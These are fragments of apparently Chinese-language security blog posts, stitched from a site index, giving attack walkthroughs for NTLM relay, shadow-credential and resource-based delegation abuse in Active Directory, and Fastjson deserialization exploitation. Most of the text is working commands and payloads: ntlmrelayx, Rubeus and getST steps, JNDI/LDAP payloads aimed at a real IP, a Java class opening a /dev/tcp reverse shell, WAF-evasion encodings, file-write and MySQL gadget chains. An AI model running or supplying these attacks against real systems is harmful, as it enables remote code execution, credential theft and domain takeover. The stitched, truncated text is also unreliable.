https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566abimage.png \" https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab 简单来说就是客户端有自己的一对密钥，KDC也存着用户的公钥。使用私钥加密预认证信息发给KDC，KDC使用用户的公钥解密，验证通过返回TGT。 Windows server2016引进了一个属性msDS-KeyCredentialLink。 该属性的值是 Key Credentials，它是包含创建日期、所有者可分辨名称等信息的序列化对象，一个代表设备 ID 的 GUID，当然还有公钥。这是一个多值属性，因为一个帐户有多个链接设备。 我的理解：我们伪造一个密钥对，通过修改msDS-KeyCredentialLink为我们伪造的公钥，AS_REQ发送伪造的公钥和伪造私钥加密的时间戳，KDC验证AS_REQ中的公钥和msDS-KeyCredentialLink的公钥，然后再用公钥解密。验证通过后返回TGT。 利用： 首先需要给一个机器新增msDS-KeyCredentialLink。机器账户可以给自己新增。高权限账户可以给其他账户新增。 python3 pywhisker.py -d \"adc.com\" -u \"administrator\" -p \"sss@123\" --target \"yangguo\" --action \"list\" --dc-ip 10.10.10.10 第一次大概率会遇到下面的错误。需要去域控上注册证书。 FAS - Request not supported while launching a published Desktop with FAS 获取hash：原理看下面这段话 https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566abimage.png \" https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab 结合NTLM Relay https://github.com/SecureAuthCorp/impacket/pull/1249 用户对象不能编辑自己的 msDS-KeyCredentialLink 属性，而机器账户可以。这意味着以下场景可以工作：从 DC01 触发 NTLM 身份验证，将其中继到 DC02，使 pywhisker 编辑 DC01 的属性以在其上创建 Kerberos PKINIT 预身份验证后门，并通过 PKINIT 和 pass-the-cache 持久访问 DC01。 计算机对象可以编辑它们自己的 msDS-KeyCredentialLink 属性，但只能在没有 KeyCredential 存在的情况下添加。 解决impacket报错 python3 -m pip install . python3 ntlmrelayx.py --shadow-credentials --shadow-target 'mssql$' -t ldap://10.10.10.10 --remove-mic ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:7","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"RBCD 基于资源的约束性委派又名RBCD。 配置约束性委派和非约束性委派都需要SeEnableDelegation权限。而这个权限一般只有域管才有。为了赋予用户更大的灵活性，微软在Windows server 2012中引进基于资源的约束性委派。 基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。 配置基于资源的约束性委派，无需SeEnableDelegation权限，只需要对机器具有写属性权限（WriteProperty）。即可配置。 msDS-AllowedToDelegateTo 变成了 msDS-AllowedToActOnBehalfOfOtherIdentity。但是方向相反。参照下图。 也就是说，serviceB上配置msDS-AllowedToActOnBehalfOfOtherIdentity的值为serviceA。那么serviceB就信任来自serviceA的委派。也就是下图的传出信任与传入信任。 https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.htmlimage.png \" https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html Relay 自动创建一个机器账户，密码随机。需要ldaps。 python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --remove-mic --delegate-access -smb2support 指定机器账户 python3 ntlmrelayx.py -t ldap://10.10.10.10 -debug --remove-mic --delegate-access --escalate-user testpc\\$ python3 getST.py -impersonate 'administrator' -spn 'cifs/WEB2.adc.com' -dc-ip 10.10.10.10 'adc.com/USCJNQTK\\$:' export KRB5CCNAME=administrator.ccache python3 psexec.py -no-pass -k 'adc.com/administrator@web2.adc.com' 计算hash .\\Rubeus.exe hash /domain:adc.com /user:USCJNQTK$ /password:\"iJ'vp3V\u003e'4De}tf\" 请求st .\\Rubeus.exe s4u /user:USCJNQTK$ /aes256:64033274241a7f086ce4254fc8a46072810c021013a546c807bad5421d33f7b6 /impersonateuser:Administrator /msdsspn:host/web2.adc.com /altservice:cifs /domain:adc.com /nowrap /ptt 加域账户 当一个用户给一台机器加域后，该用户就对该机器具有写属性权限（WriteProperty）。而企业中往往都会有一个专门的加域用户，当我们拿到了这个加域用户的凭据后，我们就可以通过RBCD控制由该用户加入域内所有机器的权限。 首先假设我们抓到了加域账户（join）的哈希或密码。 python3 rbcd.py -delegate-to 'web2' -action read 'adc.com/join:song@2020' -dc-ip 10.10.10.10 python3 rbcd.py -delegate-to 'web2' -delegate-from USCJNQTK -action write 'adc.com/join:song@2020' -dc-ip 10.10.10.10 python3 rbcd.py -delegate-to 'web2' -action read 'adc.com/join:song@2020' -dc-ip 10.10.10.10 python3 getST.py -impersonate 'administrator' -spn 'cifs/WEB2.adc.com' -dc-ip 10.10.10.10 'adc.com/USCJNQTK\\$:' ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:8","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["AD域"],"content":"参考 Relay - The Hacker Recipes NTLM 篇 - windows protocol [域渗透] SQLSERVER 结合中继与委派 安全研究 | 使用PetitPotam代替Printerbug 【M01N】资源约束委派和NTLM Relaying的组合拳接管域内任意主机系统权限 – 绿盟科技技术博客 Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members Lateral Movement – WebClient – Penetration Testing Lab ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:4:0","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["web"],"content":"0X01 漏洞利用 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:0:0","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"探测fastjson 对于有错误回显的情况 使用{\"@type\": \"java.lang.AutoCloseable\"或者 \"{\"a\":x\"通过异常直接回显出版本号，接下来就直接根据版本号判断有没有漏洞和找exp了 无回显使用dnslog探测POC： {\"@type\":“com.alibaba.fastjson.JSONObject”, {\"@type\": “java.net.URL”, “val”:“http://sq20yi.ceye.io”}}\"\"} {\"@type\":“java.net.Inet6Address”,“val”:“sq20yi.ceye.io”} 抓包修改请求体 ==dnslog==收到请求信息就代表使用了==fastjson==来解析的json数据 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:1:0","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"验证是否存在漏洞 fastjson1.2.47以后的版本利用 条件都比较苛刻，所以我们一般都会采用经典的1.2.47的POC， 无限制RCE，通杀≤1.2.47的所有版本。47版本poc如下 {\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://47.119.161.84:1389/Exploit\",\"autoCommit\":true}}} 在我们的云服务器上开启LDAP服务：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://47.119.161.84/#Exploit 同目录开启http服务：python3 -m http.server 80 NC监听：nc -lvvp 8888 javac编译下面恶意类，将编译好的Exploit.class文件放在http同目录下 public class Exploit { public Exploit(){ try{ Runtime.getRuntime().exec(\"/bin/bash -c $@|bash 0 echo bash -i \u003e\u0026/dev/tcp/xxx.xxx.xxx.xxx/8888 0\u003e\u00261\"); }catch(Exception e){ e.printStackTrace(); } } public static void main(String[] argv){ Exploit e = new Exploit(); } } 发送payload，getshell 实战基本是直接拿47版本的payload打dnslog，dnslog有反应就继续，没反应再一步一步验证。 🙃效率高很多。 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:2:0","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"绕过高版本jdk对jndi注入的限制 高版本jdk默认禁止jndi注入。 所以基于jndi+RMI的利用需要JDK版本\u003c=6u141、7u131、8u121， 基于jndi+LDAP利用的JDK版本\u003c=6u211、7u201、8u191、11.0.1 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:3:0","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"如何判断服务是否使用高版本jdk 低版本jdk的jndi注入（jdk1.8.45）： ldap收到请求重定向到http://47.119.161.84:888/Exploit.class。 再发起http请求加载Exploit.class(弹计算器) 高版本jdk的jndi注入（jdk1.8.212）： ldap服务收到了请求，可我们起的http服务却没有反应，也就访问不到我们的恶意类了。 所以实战情况下遇到上述情况（ldap服务收到信息，却没有http请求）多半可以断定是采用高版本jdk。 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:3:1","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"绕过高版本jdk对jndi注入的限制 绕过原理参考：https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html https://www.mi1k7ea.com/2020/09/07/浅析高低版JDK下的JNDI注入及绕过 依赖受害者本地CLASSPATH中环境，利用受害者本地的Gadget进行攻击。 javax.el.ELProcessor依赖于tomcat8 com.ibm.ws.webservices.engine.client.ServiceFactory依赖于IBM WebSphere com.ibm.ws.client.applicationclient.ClientJ2CCFFactory依赖于IBM WebSphere GitHub上的轮子：https://github.com/veracode-research/rogue-jndi 以实战为例：深圳地质局的fastjson ：见视频 😇 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:3:2","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"fastjson不出网与命令回显 注：此攻击手法同样适用于高版本jdk下的利用 1.2.24版本的三个POC： 1. 基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl { \"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\":[\"poc_base64\"], '_name':'a.b', '_tfactory':{ }, \"_outputProperties\":{}, \"_name\":\"a\", \"_version\":\"1.0\", \"allowedProtocols\":\"all\" } 2.基于com.sun.rowset.JdbcRowSetImpl（JNDI，用的最多） { \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true } 3.基于org.apache.tomcat.dbcp.dbcp.BasicDataSource { \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\", \"driverClassLoader\": { \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\": \"$$BCEL$$$l$8b......\" } 其中基于其中1、3利用链都是基于java字节码，不需要出网。使用47版本的绕过方式（java.lang.Class）改造1、3两个poc，使他们适用于47以下的版本。 { \"a\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\" }, \"b\": { \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"poc_base64\"], '_name': 'a.b', '_tfactory': {}, \"_outputProperties\": {}, \"_name\": \"b\", \"_version\": \"1.0\", \"allowedProtocols\": \"all\" } } { { \"@type\": \"com.alibaba.fastjson.JSONObject\", \"x\":{ \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\", \"driverClassLoader\": { \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hK","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:4:0","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"绕waf 不同与传统json标准，在fastjson中16进制是可以被解析的。它还支持在json语句中加入注释，单引号替换双引号，默认会去除键、值外的空格、\\b、\\n、\\r、\\f等等等。 如今市面上大部分waf只针对@type 和com.sun.rowset.JdbcRowSetImpl 进行检测，所以我们通过结合Unicode和16进制编码即可轻松绕过waf。 以OPPO云和阿里云waf为例 {\"name\":{\"@\\u0074\\u0079\\u0070\\u0065\":/*asdasd*/\\r\\n\"java.l\\x61ng.Cl\\x61ss\",\"val\":\"com.sun.rowset.JdbcRo\\x77\\x53etImpl\"},\"x\":{\"@\\u0074\\u0079\\u0070\\u0065\":\"com.sun.rowset.Jd\\x62\\x63RowSetImpl\",\"dataSourceName\":\"ldap://11.11.11.11:1389/Exploit\",\"autoCommit\":true}}} ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:5:0","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"fastjson1.2.68利用 和1.2.47版本的漏洞一样，68版本也是对checkAutoType()的的绕过，无需考虑fastjson的黑名单进行利用。 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:6:0","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"任意文件写入 参考：https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg 依赖于commons-io 2.0 - 2.6 的POC： { \"x\":{ \"@type\":\"com.alibaba.fastjson.JSONObject\", \"input\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.ReaderInputStream\", \"reader\":{ \"@type\":\"org.apache.commons.io.input.CharSequenceReader\", \"charSequence\":{\"@type\":\"java.lang.String\"\"aaaaaa...(长度要大于8192，实际写入前8192个字符)\" }, \"charsetName\":\"UTF-8\", \"bufferSize\":1024 }, \"branch\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.output.WriterOutputStream\", \"writer\":{ \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\":\"/tmp/pwned\", \"encoding\":\"UTF-8\", \"append\": false }, \"charsetName\":\"UTF-8\", \"bufferSize\": 1024, \"writeImmediately\": true }, \"trigger\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger2\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger3\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" } }} 依赖于commons-io 2.7 - 2.8.0 的POC： { \"x\":{ \"@type\":\"com.alibaba.fastjson.JSONObject\", \"input\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.ReaderInputStream\", \"reader\":{ \"@type\":\"org.apache.commons.io.input.CharSequenceReader\", \"charSequence\":{\"@type\":\"java.lang.String\"\"aaaaaa...(长度要大于8192，实际写入前8192个字符)\", \"start\":0, \"end\":2147483647 }, \"charsetName\":\"UTF-8\", \"bufferSize\":1024 }, \"branch\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.output.WriterOutputStream\", \"writer\":{ \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\":\"/tmp/pwned\", \"charsetName\":\"UTF-8\", \"append\": false }, \"charsetName\":\"UTF-8\", \"bufferSize\": 1024, \"writeImmediately\": true }, \"trigger\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger2\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger3\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" } } 本地windows测试第一次成功写入，后面的只创建了文件并没有写入，需要刷新缓存或者重启服务才行 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:6:1","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"Mysql RCE https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg BlackHat2021 腾讯玄武实验室的大佬公开了68版本mysql的利用链。配合恶意mysql服务端造成远程命令执行 https://dmsj-zjk.oss-cn-zhangjiakou.aliyuncs.com/share%2Fppt%2FBlackHat USA 2021%2Fus-21-Xing-How-I-Use-A-JSON-Deserialization.pdf?OSSAccessKeyId=LTAI4GKC6j39Agb66ieR44Ke\u0026Expires=1629276415\u0026Signature=jQ5O9EsNhlrXaLRbGAmDk7vrxDg%3D 5.1.x(SSRF)，5.1.11-5.1.48(反序列化链) { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"127.0.0.1\", \"portToConnectTo\": 3306, \"info\": { \"user\": \"yso_CommonsCollections4_calc\", \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }, \"databaseToConnectTo\": \"dbname\", \"url\": \"\" } 6.0.2/6.0.3(反序列化) { \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\", \"proxy\": { \"connectionString\":{ \"url\":\"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true\u0026statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026user=yso_CommonsCollections4_calc\" } } } 8.0.19(反序列化链)，8.0.19+(SSRF) { \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\", \"proxy\": { \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\", \"connectionUrl\":{ \"@type\":\"com.mysql.cj.conf.url.ReplicationConnectionUrl\", \"masters\":[{ \"host\":\"\" }], \"slaves\":[], \"properties\":{ \"host\":\"127.0.0.1\", \"user\":\"yso_CommonsCollections4_calc\", \"dbname\":\"dbname\", \"password\":\"pass\", \"queryInterceptors\":\"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\":\"true\" } } } } 以下为去年去年调试分析时的笔记，大量参考（拙劣模仿）了phith0n、kingx、mi1k7ea等师傅的文章，仅供参考。强烈建议阅读原文。文末有链接 0x02 调试分析 Fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。 fastjson在阿里巴巴大规模使用，在数万台服务器上部署，Fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。出现安全问题影响范围很广。 采用一种“假定有序快速匹配”的算法，是号称Java中最快的json库 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:6:2","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"环境搭建 idea中新建maven项目，在pom.xml中添加以下代码即可 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003eorg.example\u003c/groupId\u003e \u003cartifactId\u003efastjsonVulTest\u003c/artifactId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003cbuild\u003e \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.apache.maven.plugins\u003c/groupId\u003e \u003cartifactId\u003emaven-compiler-plugin\u003c/artifactId\u003e \u003cconfiguration\u003e \u003csource\u003e8\u003c/source\u003e \u003ctarget\u003e8\u003c/target\u003e \u003c/configuration\u003e \u003c/plugin\u003e \u003c/plugins\u003e \u003c/build\u003e \u003cdependencies\u003e \u003c!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.alibaba\u003c/groupId\u003e \u003cartifactId\u003efastjson\u003c/artifactId\u003e \u003cversion\u003e1.2.24\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.commons\u003c/groupId\u003e \u003cartifactId\u003ecommons-compress\u003c/artifactId\u003e \u003cversion\u003e1.0\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-codec\u003c/groupId\u003e \u003cartifactId\u003ecommons-codec\u003c/artifactId\u003e \u003cversion\u003e1.6\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-io\u003c/groupId\u003e \u003cartifactId\u003ecommons-io\u003c/artifactId\u003e \u003cversion\u003e1.4\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.unboundid\u003c/groupId\u003e \u003cartifactId\u003eunboundid-ldapsdk\u003c/artifactId\u003e \u003cversion\u003e4.0.9\u003c/version\u003e \u003cscope\u003ecompile\u003c/scope\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat\u003c/groupId\u003e \u003cartifactId\u003etomcat-dbcp\u003c/artifactId\u003e \u003cversion\u003e9.0.8\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/project\u003e 0x03 FastJSON基础 当反序列化为JSON.parseObject(*)形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法调用了两次； 当反序列化为JSON.parseObject(,.class)形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法； 当反序列化为JSON.parseObject()形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即JSON.parseObject(,*.class)形式得到的都是特定的Student类； 如果需要还原出private属性的话，还需要在JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:7:0","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"基于TemplateImpl的利用链 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:8:0","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"依赖 Java字节码的执行，需要设置Feature.SupportNonPublicField进行反序列化操作才能成功触发利用。 **** ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:8:1","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"POC Test.java package com; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class Test extends AbstractTranslet { public Test() throws IOException { 